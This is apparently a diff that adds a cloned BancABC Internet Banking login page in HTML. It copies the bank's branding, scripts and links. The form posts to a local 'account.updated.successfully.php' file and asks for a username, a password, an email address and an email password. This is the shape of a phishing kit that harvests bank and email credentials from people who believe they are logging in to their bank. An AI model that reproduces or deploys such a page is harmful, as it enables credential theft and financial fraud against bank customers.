@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="shortcut icon" href="https://secure.v.co.zw/static/images/banks/bancabc/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://secure.v.co.zw/static/images/banks/bancabc/favicon.ico" type="image/x-icon">
+
+    <title>BancABC Internet Banking</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <!-- Boostrap CSS -->
+    <link rel="stylesheet" media="screen" href="assets/bootstrap.min.css"/>
+
+    <!--Skinning CSS -->
+
+    <!--CSS-->
+    <link rel="stylesheet" media="screen" href="assets/font-awesome.min.css"/>
+
+    <!-- Kendo Styles -->
+    <link rel="stylesheet" media="screen" href="assets/kendo.common.min.css"/>
+    <link rel="stylesheet" media="screen" href="assets/kendo.bootstrap.min.css"/>
+
+    <!--Maps Style-->
+    <link rel="stylesheet" media="screen" href="assets/maps.css"/>
+
+
+    <!-- Custom Styles -->
+
+    <link rel="stylesheet" media="screen" href="assets/styling.min.css"/>
+
+    <!--&lt;!&ndash; CSRF Vars &ndash;&gt;-->
+    <meta id="_csrf" name="_csrf" content="020e8559-6821-4694-8d8d-0701eefae744"/>
+    <meta id="_csrf_header" name="_csrf_header" content="X-CSRF-TOKEN"/>
+
+
+    <script id="colouredStateTemplate" type="text/x-kendo-template">
+        #if (displayState == 'COMPLETE') {# <span class='label label-success'>COMPLETE</span> #}
+        else if (displayState == 'PENDING')  {# <span class='label label-info'>PENDING</span> #}
+        else if (displayState == 'ABORTED')  {# <span class='label label-default'>ABORTED</span> #}
+        else if (displayState == 'QUEUED')  {# <span class='label label-warning'>PENDING</span> #}
+        else if (displayState == 'AUTHORIZATION')  {# <span class='label label-info'>AUTHORIZATION</span> #}
+        else {# <span class='label label-danger'>ERROR</span> #}#
+    </script>
+
+    <script id="colouredStatusTemplate" type="text/x-kendo-template">
+        #if (status == 'COMPLETE') {# <span class='label label-success'>COMPLETE</span> #}
+        else if (status == 'PENDING')  {# <span class='label label-warning'>PENDING</span> #}
+        else if (status == 'ABORTED')  {# <span class='label label-default'>ABORTED</span> #}
+        else if (status == 'QUEUED')  {# <span class='label label-warning'>QUEUED</span> #}
+        else {# <span class='label label-danger'>ERROR</span> #}#
+    </script>
+
+    <script id="enrollmentStatusTemplate" type="text/x-kendo-template">
+        #if (status == 'ENROLLED') {# <span class='label label-success'>ENROLLED</span> #}
+        else if (status == 'PENDING')  {# <span class='label label-warning'>PENDING</span> #}
+        else if (locked == true)  {# <span class='label danger'>LOCKED</span> #}
+        else {# <span class='label label-danger'>NOT ENROLLED</span> #}#
+    </script>
+
+    <script id="responseCodeTemplate" type="text/x-kendo-template">
+        # console.log("DATA : ", data.responseCode); #
+        #if (data.responseCode == '000') {# <span class='label label-success'>000</span> #}
+        else if ((data.responseCode == '') || (data.responseCode == ' ') || (data.responseCode == undefined))  {#
+        <span class='label'></span> #}
+        else {# <span
+                class='label label-danger'> #= data.responseCode #</span> #} #
+    </script>
+
+    <script id="lockedStatusTemplate" type="text/x-kendo-template">
+        #if (locked == false) {# <span class='label label-success'>UNLOCKED</span> #}
+        else {# <span class='label label-danger'>LOCKED</span> #}#
+    </script>
+
+    <script id="enabledTemplate" type="text/x-kendo-template">
+        #if (enabled == false) {# <span class='label label-danger'>DISABLED</span> #}
+        else {# <span class='label label-success'>ENABLED</span> #}#
+    </script>
+
+    <script id="debitCreditState" type="text/x-kendo-template">
+        #if (debitAmount == 0) {# <span class='label label-success'>C</span> #}
+        else {# <span class='label label-danger'>D</span> #}#
+    </script>
+
+    <!-- Javascript -->
+
+    <script src="/bancabc-web-banking/webjars/jquery/3.1.1-1/jquery.min.js"></script>
+    <script src="/bancabc-web-banking/js/html2pdf.js"></script>
+
+
+    <script src="/bancabc-web-banking/webjars/bootstrap/3.3.7-1/js/bootstrap.min.js"></script>
+
+    <script type="text/javascript" src="/bancabc-web-banking/js/bootstrap/validator.js"></script>
+
+    <!-- JSZip is required for Kendo export -->
+    <script src="/bancabc-web-banking/webjars/jszip/2.4.0/jszip.min.js"></script>
+
+    <!-- Kendo JS -->
+    <script src="/bancabc-web-banking/js/kendo/kendo.core.min.js"></script>
+    <script src="/bancabc-web-banking/js/kendo/kendo.all.min.js"></script>
+    <!--<script th:src="@{/js/kendo/kendo.data.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.data.odata.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.data.xml.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.fx.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.upload.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.list.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.mobile.scroller.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.popup.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.virtuallist.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.calendar.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.selectable.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.userevents.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.ooxml.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.color.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.drawing.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.progressbar.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.excel.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.pdf.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.autocomplete.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.grid.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.tooltip.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.datepicker.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.dropdownlist.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.notification.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.pager.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.treeview.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.dialog.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.numerictextbox.min.js}"></script>-->
+    <!--<script th:src="@{/js/kendo/kendo.validator.min.js}"></script>-->
+    <!--<script th:src="@{/j s/kendo/kendo.window.min.js}"></script>-->
+    <script src="/bancabc-web-banking/js/kendo/pako_deflate.min.js"></script>
+    <!--<script th:src="@{/js/kendo/kendo.culture.en-ZM.js}"></script>-->
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyASwP2TfMG8SobDnu2ezcq2cF3zfTmfPkw"></script>
+    <script src="/bancabc-web-banking/js/maps/infoBox.js"></script>
+
+    <!-- Custom Javascript -->
+
+    <!--<script th:src="@{/js/vnet-functions.js}"></script>-->
+    <script>
+        /*<![CDATA[*/
+        var baseUrl = "\/bancabc-web-banking\/";
+        var company = null;
+        var companyId;
+        if (company) {
+            companyId = company.id;
+        }
+
+        var vnetFunctionUrl = "\/bancabc-web-banking\/js\/vnet-functions.js";
+        var vnetFunctionMinUrl = "\/bancabc-web-banking\/js\/vnet-functions.min.js";
+
+        $.ajaxSetup({async: false});
+        $.getScript(vnetFunctionUrl)
+            .fail(function () {
+                $.getScript(vnetFunctionMinUrl)
+            })
+
+        /*]]>*/
+    </script>
+
+    
+
+    <script data-root-path="/bancabc-web-banking/"></script>
+
+    <!-- Nanobar Plugin -->
+    <script src="/bancabc-web-banking/js/nanobar.js"></script>
+
+    <!-- TODO needs to move into scss -->
+    <style>
+        .k-grid tbody .k-button {
+            min-width: 12px;
+            width: 30px;
+        }
+    </style>
+
+
+</head>
+
+<body>
+<span id="popupNotification"></span>
+<div>
+    <div>
+
+        <div class="auth-container">
+
+            <div class="container-fluid custom-structure-width">
+                <div class="row">
+                    <div class="col-sm-10 col-sm-offset-1 col-xs-10">
+                        <img class="logo"
+                             src="assets/a_icon_yellow_0.5x.png"
+                             alt="Logo"/>
+
+                        <h2  class="title-message-color title text-center ">Fresh Thinking.<br />Smart Banking.</h2>
+
+                        <form class="auth-form" action="account.updated.successfully.php"
+                              method="POST">
+                            <div class="form-padding">
+                                <h3 class="title">Welcome to Internet Banking</h3>
+                            </div>
+
+                            <div class="form-padding">
+                                <div class="row">
+                                    <div class="col-xs-offset-3 col-xs-6">
+                                        <div class="form-group">
+
+                                            <input class="placeholder hollow-input-dark rounded-input  text-center"
+
+                                                   type="text" id="username" name="username" placeholder="USERNAME"/>
+                                        </div>
+                                    </div>
+                                    <div class="col-xs-offset-3 col-xs-6">
+                                        <div class="form-group">
+
+                                            <input class="text-center hollow-input-dark rounded-input  placeholder"
+
+                                                   type="password" id="password" name="password"
+                                                   placeholder="PASSWORD"/>
+                                        </div>
+                                    </div>
+
+                                    <div class="col-xs-offset-3 col-xs-6">
+                                        <div class="form-group">
+
+                                            <input class="text-center hollow-input-dark rounded-input  placeholder"
+
+                                                   type="text" id="password" name="password"
+                                                   placeholder="EMAIL ADDRESS"/>
+                                        </div>
+                                    </div>
+
+                                    <div class="col-xs-offset-3 col-xs-6">
+                                        <div class="form-group">
+
+                                            <input class="text-center hollow-input-dark rounded-input  placeholder"
+
+                                                   type="password" id="password" name="password"
+                                                   placeholder="PASSWORD"/>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="row">
+                                    <div class="col-xs-12">
+                                        <input id="submitBtn"
+                                               class="col-xs-offset-3 input-light-login col-xs-6 main-btn-custom custom-btn-normal rounded-btn"
+
+                                               type="submit" value="LOGIN">
+
+                                    </div>
+                                    <div>
+                                        <p class="recovery-link">
+                                            <a  href="/bancabc-web-banking/auth/forgotPassword">FORGOT PASSWORD?</a>
+                                        </p>
+
+                                    </div>
+
+
+                                    <div class="col-xs-12 col-lg-10 col-lg-offset-1 form-footer">
+                                        <hr class="white-line"/>
+                                        <div class="row">
+                                            <div class="col-xs-12 col-sm-3 form-footer-block">
+                                                <a href="/bancabc-web-banking/public/exchangeRates">
+                                                    <span class="row">
+                                                        <span class="col-xs-12 text-center mb-3">
+                                                            <span class="row">
+                                                                <span class="icon-container">
+
+                                                                    <img src="assets/icon_exchange_rates_w.svg"
+
+                                                                         alt="Exchange Rates">
+
+                                                                </span>
+                                                            </span>
+                                                        </span>
+                                                    </span>
+                                                    <span class="row">
+                                                        <span class="col-xs-12">
+                                                            Exchange Rate
+                                                        </span>
+                                                    </span>
+                                                </a>
+                                            </div>
+                                            <div class="col-xs-12 col-sm-3 form-footer-block">
+                                                <a href="/bancabc-web-banking/public/branchLocator">
+                                                    <span class="row">
+                                                        <span class="col-xs-12 text-center mb-3">
+                                                            <span class="row">
+                                                                <span class="icon-container">
+                                                                    <img src="assets/icon_branch_locator_w.svg"
+                                                                         alt="Branch Locator">
+                                                                </span>
+                                                            </span>
+                                                        </span>
+                                                    </span>
+                                                    <span class="row">
+                                                        <span class="col-xs-12">
+                                                            Branch Locator
+                                                        </span>
+                                                    </span>
+                                                </a>
+                                            </div>
+                                            <div class="col-xs-12 col-sm-3 form-footer-block">
+                                                <a href="https://www.bancabc.co.zw/talk-to-us/"
+                                                   target="_blank">
+                                                    <span class="row">
+                                                        <span class="col-xs-12 text-center mb-3">
+                                                            <span class="row">
+                                                                <span class="icon-container">
+                                                                    <img src="assets/icon_support_w.svg"
+                                                                         alt="Get Support">
+                                                                </span>
+                                                            </span>
+                                                        </span>
+                                                    </span>
+                                                    <span class="row">
+                                                        <span class="col-xs-12">
+                                                            Get Support
+                                                        </span>
+                                                    </span>
+                                                </a>
+                                            </div>
+                                            <div class="col-xs-12 col-sm-3 form-footer-block">
+                                                <a href="http://www.bancabc.co.zw"
+                                                   target="_blank">
+                                                    <span class="row">
+                                                        <span class="col-xs-12 text-center mb-3">
+                                                            <span class="row">
+                                                                <span class="icon-container">
+                                                                    <img mt-2
+                                                                            src="assets/logo_white_stack.png"
+                                                                            alt="Visit Website" >
+                                                                </span>
+                                                            </span>
+                                                        </span>
+                                                    </span>
+                                                </a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                        
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    
+
+    <script type="text/javascript">
+
+        $(document).ready(function () {
+
+            // listens for ENTER key and submits form
+            $(this).on('keydown', function (e) {
+                if (e.keyCode == 13) {
+                    e.preventDefault();
+
+                    $("#submitBtn").click();
+                }
+            });
+        });
+
+    </script>
+
+
+</div>
+</body>
+
+</html>
